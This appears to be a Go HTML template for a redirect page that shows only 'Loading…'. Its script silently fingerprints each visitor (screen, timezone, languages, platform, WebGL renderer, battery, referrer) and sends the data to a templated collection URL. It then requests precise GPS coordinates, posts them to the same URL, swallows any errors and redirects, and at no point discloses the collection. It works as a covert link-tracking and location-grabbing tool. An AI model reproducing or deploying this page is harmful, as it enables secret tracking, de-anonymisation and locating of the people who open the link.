<!DOCTYPE html>
<html>
<head><title>Loading…</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<noscript><meta http-equiv="refresh" content="0; url={{.Destination}}"></noscript>
<script>
(async () => {
  const fp = {
    screen: {
      w: screen.width,
      h: screen.height,
      availW: screen.availWidth,
      availH: screen.availHeight,
      dpr: window.devicePixelRatio || 1,
      colorDepth: screen.colorDepth
    },
    viewport: { w: innerWidth, h: innerHeight },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    languages: Array.from(navigator.languages || []),
    platform: navigator.platform,
    touch: navigator.maxTouchPoints || 0,
    hwConcurrency: navigator.hardwareConcurrency,
    doNotTrack: navigator.doNotTrack,
    webgl: (() => {
      try {
        const c = document.createElement('canvas').getContext('webgl');
        if (!c) return null;
        const ext = c.getExtension('WEBGL_debug_renderer_info');
        return ext ? { vendor: c.getParameter(ext.UNMASKED_VENDOR_WEBGL), renderer: c.getParameter(ext.UNMASKED_RENDERER_WEBGL) } : null;
      } catch { return null; }
    })(),
    referrer: document.referrer || null
  };
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      fp.battery = { level: Math.round(b.level * 100), charging: b.charging };
    }
  } catch (_) {}
  try {
    await fetch({{.FingerprintURL}}, {
      method: 'POST',
      body: JSON.stringify(fp),
      headers: {'Content-Type': 'application/json'},
      keepalive: true
    });
  } catch (_) { /* swallow */ }
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        try {
          fetch({{.FingerprintURL}}, {
            method: 'POST',
            body: JSON.stringify({
              gps: {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
              }
            }),
            headers: {'Content-Type': 'application/json'},
            keepalive: true
          });
        } catch (_) {}
      },
      () => {},
      { timeout: 3000, enableHighAccuracy: true }
    );
  }
  window.location.replace({{.Destination}});
})();
</script>
</body>
</html>
